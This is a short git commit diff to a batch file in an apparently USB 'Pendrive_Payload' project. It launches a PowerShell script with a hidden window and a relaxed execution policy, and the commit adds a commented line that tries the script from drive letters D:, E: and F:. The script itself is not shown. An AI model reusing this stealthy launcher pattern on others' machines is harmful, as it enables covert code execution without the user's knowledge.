c0e7ac733093bc2062a59899066936f3f902e59d
dsSev <sevaara@protonmail.ch>
2015-08-09 18:25:42 +0100

    Added USB drive path files

--- Setup.bat
+++ Setup.bat
@@ -1,3 +1,4 @@
 @echo off
 Powershell.exe -windowstyle hidden -executionpolicy remotesigned -File  C:\Users\"user"\Desktop\Pendrive_Payload\SetupInfo.ps1
 
+::Powershell.exe -windowstyle hidden -executionpolicy remotesigned -File D:\SetupInfo.ps1 || E:\SetupInfo.ps1 || F:\SetupInfo.ps1
